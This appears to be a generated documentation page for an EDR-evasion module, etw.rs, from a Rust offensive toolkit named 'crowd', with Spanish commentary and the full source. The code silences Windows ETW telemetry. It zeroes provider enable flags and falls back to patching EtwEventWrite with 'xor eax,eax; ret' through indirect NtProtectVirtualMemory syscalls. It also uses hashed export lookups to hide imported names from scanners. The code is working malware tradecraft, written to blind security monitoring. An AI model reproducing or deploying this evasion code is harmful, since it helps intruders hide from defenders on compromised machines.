# crowd — etw.rs  (⚡ GOD TIER — zero Win32 surface, PEB hash walker + RecycledGate only)

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/etw.rs` |
| **Lines** | 236 |
| **Tier** | Z |
| **Cards** | T009-edr-evasion |
| **Role** | ETW muffling |
| **Unsafe blocks** | 5 |

## Purpose

# crowd — etw.rs  (⚡ GOD TIER — zero Win32 surface, PEB hash walker + RecycledGate only)

## ETW Muffle — silenciar telemetría ETW del proceso actual

### Técnica primaria: Manipulación de punteros en estructuras ETW (sin byte-patch)

Windows mantiene una lista de providers ETW registrados en el proceso.
Cada provider tiene una estructura `_ETW_GUID_ENTRY` que contiene entre otros
el campo `ProviderEnableInfo` (callback de habilitación) y `RegIndex`.
El kernel llama `EtwEventWrite` → `EtwpEventWriteFull` → consulta `GuidEntry`
para saber si el provider está habilitado.

La técnica: localizar el campo `EnableFlags` dentro de cada `_ETW_GUID_ENTRY`
del proceso (accesible desde `EtwRegistrationList` en el PEB/LDR o mediante
el handle del provider) y forzarlo a 0. Cuando `EnableFlags == 0`,
`EtwEventWrite` retorna `STATUS_SUCCESS` sin emitir ningún evento.

**Sin patchear byte alguno** en el .text de ntdll — solo se modifican datos
en la tabla de GUIDs que vive en el heap del proceso.

### Técnica de fallback: NtProtectVirtualMemory + xor eax,eax;ret

Si la manipulación de estructuras falla (feature no disponible, offset
incorrecto en versión de Windows distinta), se aplica el byte-patch clásico
vía `NtProtectVirtualMemory` (RecycledGate — sin hooking surface de kernel32).

### Compatibilidad
Ninguna técnica usa DR registers ni VEH. Zero conflicto con AMSI HBP.

## Constants

- `ETW_PATCH`: `[u8; 3]` = `[0x33, 0xC0, 0xC3]`
- `HASH_ETW_EVENT_WRITE`: `u32` = `0x24A8D022`
- `HASH_ETW_REGISTRATION_LIST`: `u32` = `0xC34BFDEC`
- `ETW_GUID_ENTRY_GUIDLIST_OFFSET`: `usize` = `0x00` — LIST_ENTRY at start
- `ETW_GUID_ENTRY_ENABLE_INFO_OFFSET`: `usize` = `0x38` — EnableInfo.IsEnabled

## Public API

### `muffle_etw_providers` `unsafe` (line 128)
```rust
pub unsafe fn muffle_etw_providers() -> bool
```
Attempt to disable all ETW providers in the current process by setting
`EnableInfo.IsEnabled = 0` in each `_ETW_GUID_ENTRY`.

Returns `true` if at least one provider was silenced.

### `patch_etw_via_nt` `unsafe` (line 173)
```rust
pub unsafe fn patch_etw_via_nt() -> bool
```
Patch `EtwEventWrite` → `xor eax,eax; ret` via NtProtectVirtualMemory (RecycledGate).
This is the byte-writing path — only used when provider manipulation fails.

### `muffle_etw` `unsafe` (line 223)
```rust
pub unsafe fn muffle_etw() -> bool
```
Apply ETW muffling.
1st: Provider structure EnableFlags zeroing (no byte writes — best OPSEC).
2nd: NtProtectVirtualMemory byte-patch (RecycledGate — own hash resolution).
Returns true if any method succeeded.

## Internal Functions

- `resolve_etw_event_write` (line 47)
- `resolve_export_by_hash` (unsafe) — Walk the export table of a given module base, find the function whose (line 60)

## Key Dependencies

- `use crate::mega_dbg;`

## Full Source

```rust
//! # crowd — etw.rs  (⚡ GOD TIER — zero Win32 surface, PEB hash walker + RecycledGate only)
//!
//! ## ETW Muffle — silenciar telemetría ETW del proceso actual
//!
//! ### Técnica primaria: Manipulación de punteros en estructuras ETW (sin byte-patch)
//!
//! Windows mantiene una lista de providers ETW registrados en el proceso.
//! Cada provider tiene una estructura `_ETW_GUID_ENTRY` que contiene entre otros
//! el campo `ProviderEnableInfo` (callback de habilitación) y `RegIndex`.
//! El kernel llama `EtwEventWrite` → `EtwpEventWriteFull` → consulta `GuidEntry`
//! para saber si el provider está habilitado.
//!
//! La técnica: localizar el campo `EnableFlags` dentro de cada `_ETW_GUID_ENTRY`
//! del proceso (accesible desde `EtwRegistrationList` en el PEB/LDR o mediante
//! el handle del provider) y forzarlo a 0. Cuando `EnableFlags == 0`,
//! `EtwEventWrite` retorna `STATUS_SUCCESS` sin emitir ningún evento.
//!
//! **Sin patchear byte alguno** en el .text de ntdll — solo se modifican datos
//! en la tabla de GUIDs que vive en el heap del proceso.
//!
//! ### Técnica de fallback: NtProtectVirtualMemory + xor eax,eax;ret
//!
//! Si la manipulación de estructuras falla (feature no disponible, offset
//! incorrecto en versión de Windows distinta), se aplica el byte-patch clásico
//! vía `NtProtectVirtualMemory` (RecycledGate — sin hooking surface de kernel32).
//!
//! ### Compatibilidad
//! Ninguna técnica usa DR registers ni VEH. Zero conflicto con AMSI HBP.

#![allow(dead_code)]

#[allow(unused_imports)]
use crate::mega_dbg;

// ── Constantes de patch de fallback ──────────────────────────────────────────
// xor eax, eax (33 C0) + ret (C3) — hace que EtwEventWrite retorne EAX=0
const ETW_PATCH: [u8; 3] = [0x33, 0xC0, 0xC3];

// ── DJB2 precalculated hashes (no string literals in binary) ─────────────────
// Offline: djb2("EtwEventWrite") = 0x24A8D022
// Offline: djb2("EtwRegistrationList") = 0xC34BFDEC
const HASH_ETW_EVENT_WRITE:      u32 = 0x24A8D022;
const HASH_ETW_REGISTRATION_LIST: u32 = 0xC34BFDEC;

// ── Resolución de EtwEventWrite via PEB walker + export table ────────────────

fn resolve_etw_event_write() -> Option<*mut u8> {
    let (ntdll, _) = crate::resolve::ntdll_base_and_name_hashes();
    if ntdll.is_null() {
        return None;
    }
    let hash = HASH_ETW_EVENT_WRITE;
    // Use our resolve machinery (same as RecycledGate SSN resolution)
    let addr = unsafe { resolve_export_by_hash(ntdll, hash) };
    if addr.is_null() { None } else { Some(addr) }
}

/// Walk the export table of a given module base, find the function whose
/// DJB2-hashed name matches `target_hash`, return RVA→VA pointer.
unsafe fn resolve_export_by_hash(base: *const u8, target_hash: u32) -> *mut u8 {
    if base.is_null() { return std::ptr::null_mut(); }
    if *(base as *const u16) != 0x5A4D { return std::ptr::null_mut(); }

    let e_lfanew = *(base.add(0x3C) as *const u32) as usize;
    let nt = base.add(e_lfanew);
    // DataDirectory[0] = EXPORT (offset 0x88 in PE64 optional header)
    let export_rva = *(nt.add(0x88) as *const u32) as usize;
    if export_rva == 0 { return std::ptr::null_mut(); }

    let exp = base.add(export_rva);
    let n_names = *(exp.add(0x18) as *const u32) as usize;
    let names   = base.add(*(exp.add(0x20) as *const u32) as usize) as *const u32;
    let ords    = base.add(*(exp.add(0x24) as *const u32) as usize) as *const u16;
    let funcs   = base.add(*(exp.add(0x1C) as *const u32) as usize) as *const u32;

    for i in 0..n_names {
        let name_rva = *names.add(i) as usize;
        let cstr = base.add(name_rva);
        let mut len = 0usize;
        while *cstr.add(len) != 0 { len += 1; }
        let slice = std::slice::from_raw_parts(cstr, len);
        let hash = {
            let mut h: u32 = 5381;
            for &b in slice { h = h.wrapping_shl(5).wrapping_add(h).wrapping_add(b as u32); }
            h
        };
        if hash == target_hash {
            let ord = *ords.add(i) as usize;
            let rva = *funcs.add(ord) as usize;
            return base.add(rva) as *mut u8;
        }
    }
    std::ptr::null_mut()
}

// ── Técnica primaria: ETW Provider EnableFlags = 0 ───────────────────────────
//
// _ETW_GUID_ENTRY layout (approximate, varies by Windows version):
//   +0x00  LIST_ENTRY GuidList        (2 pointers)
//   +0x10  LIST_ENTRY RegList         (2 pointers)
//   +0x20  ULONG64    Luid            (for trace)
//   +0x28  GUID       ProviderId      (16 bytes)
//   +0x38  ETW_PROVIDER_ENABLE_INFO EnableInfo
//          +0x00  UCHAR  IsEnabled
//          +0x01  UCHAR  Level
//          +0x02  USHORT Reserved
//          +0x04  ULONG  EnableProperty
//          +0x08  ULONG  ControlFlags
//
// We locate GuidList via the EtwRegistrationList exported from ntdll (Win10+)
// or by scanning the heap of providers registered by the process itself.
//
// Simpler and robust approach: NtQuerySystemInformation class 96
// (SystemExtendedHandleInformation) finds ETW trace handles, but that's
// complex. Instead we use the `EtwRegistrationList` exported symbol when
// available, and iterate registered providers setting EnableInfo.IsEnabled=0.
//
// For Windows 10/11 the symbol `EtwRegistrationList` is a LIST_ENTRY in ntdll
// that chains all ETW_GUID_ENTRY structures for providers in this process.

const ETW_GUID_ENTRY_GUIDLIST_OFFSET:    usize = 0x00; // LIST_ENTRY at start
const ETW_GUID_ENTRY_ENABLE_INFO_OFFSET: usize = 0x38; // EnableInfo.IsEnabled

/// Attempt to disable all ETW providers in the current process by setting
/// `EnableInfo.IsEnabled = 0` in each `_ETW_GUID_ENTRY`.
///
/// Returns `true` if at least one provider was silenced.
pub unsafe fn muffle_etw_providers() -> bool {
    let (ntdll, _) = crate::resolve::ntdll_base_and_name_hashes();
    if ntdll.is_null() { return false; }

    // Resolve EtwRegistrationList — exported symbol in ntdll (Win10+)
    // NOTE: EtwRegistrationList is NOT a public/exported symbol in most ntdll
    // versions. GetProcAddress / export-table walk will typically fail.
    // When it does, we fall through to the byte-patch fallback (patch_etw_via_nt).
    let hash = HASH_ETW_REGISTRATION_LIST;
    let list_head = resolve_export_by_hash(ntdll, hash);
    if list_head.is_null() {
        mega_dbg!("[etw] EtwRegistrationList not found in ntdll exports — symbol is private/unexported on this build; falling back to EtwEventWrite byte-patch");
        return false;
    }

    // LIST_ENTRY = { Flink: *mut, Blink: *mut }
    // Walk the list from Flink until we circle back to head
    let head = list_head as *mut usize;
    let mut current = *head as *mut usize; // Flink
    let mut count = 0u32;

    while !current.is_null() && current != head && count < 512 {
        // The LIST_ENTRY is at offset ETW_GUID_ENTRY_GUIDLIST_OFFSET within
        // the ETW_GUID_ENTRY. So the entry base = current - GUIDLIST_OFFSET.
        let entry_base = (current as usize).wrapping_sub(ETW_GUID_ENTRY_GUIDLIST_OFFSET)
            as *mut u8;

        // Zero out EnableInfo.IsEnabled byte
        let enable_byte = entry_base.add(ETW_GUID_ENTRY_ENABLE_INFO_OFFSET);
        // Volatile write prevents compiler optimisation
        std::ptr::write_volatile(enable_byte, 0u8);

        // Advance: Flink = current[0]
        let next = *current;
        current = next as *mut usize;
        count += 1;
    }

    count > 0
}

// ── Técnica de fallback: byte-patch vía NtProtectVirtualMemory ────────────────

/// Patch `EtwEventWrite` → `xor eax,eax; ret` via NtProtectVirtualMemory (RecycledGate).
/// This is the byte-writing path — only used when provider manipulation fails.
pub unsafe fn patch_etw_via_nt() -> bool {
    let etw_addr = match resolve_etw_event_write() {
        Some(a) => a,
        None    => return false,
    };

    let mut old_protect: u32 = 0;
    let mut base_addr   = etw_addr as usize;
    let mut region_size = ETW_PATCH.len();

    let hash = crate::resolve::compute_hash("NtProtectVirtualMemory");
    let args = [
        (-1isize) as usize,                              // ProcessHandle = current
        &mut base_addr    as *mut usize as usize,
        &mut region_size  as *mut usize as usize,
        0x04usize,                                       // PAGE_READWRITE (NOT RWX — never 0x40)
        &mut old_protect  as *mut u32  as usize,
    ];
    let status = crate::recycled::invoke(hash, 5, &args);
    if status != 0 { return false; }

    std::ptr::copy_nonoverlapping(ETW_PATCH.as_ptr(), etw_addr, ETW_PATCH.len());

    // Restore permissions
    let mut base_addr2   = etw_addr as usize;
    let mut region_size2 = ETW_PATCH.len();
    let args2 = [
        (-1isize) as usize,
        &mut base_addr2   as *mut usize as usize,
        &mut region_size2 as *mut usize as usize,
        old_protect as usize,
        &mut old_protect  as *mut u32  as usize,
    ];
    let _ = crate::recycled::invoke(hash, 5, &args2);

    true
}

// NOTE: Win32 fallback (patch_etw_event_write) REMOVED — was redundant with
// patch_etw_via_nt() and introduced GetModuleHandleA/GetProcAddress Win32 imports.
// Both paths resolve EtwEventWrite and patch it; the RecycledGate path in
// patch_etw_via_nt() uses our own PEB hash walker for resolution, which is
// strictly superior (no Win32 hooking surface).

// ── Public entry point ────────────────────────────────────────────────────────

/// Apply ETW muffling.
/// 1st: Provider structure EnableFlags zeroing (no byte writes — best OPSEC).
/// 2nd: NtProtectVirtualMemory byte-patch (RecycledGate — own hash resolution).
/// Returns true if any method succeeded.
pub unsafe fn muffle_etw() -> bool {
    if muffle_etw_providers() {
        mega_dbg!("[etw] provider EnableFlags zeroing succeeded");
        return true;
    }
    mega_dbg!("[etw] provider zeroing failed, attempting EtwEventWrite byte-patch fallback");
    let ok = patch_etw_via_nt();
    if ok {
        mega_dbg!("[etw] EtwEventWrite byte-patch succeeded");
    } else {
        mega_dbg!("[etw] WARNING: all ETW muffling techniques failed — telemetry may be active");
    }
    ok
}

```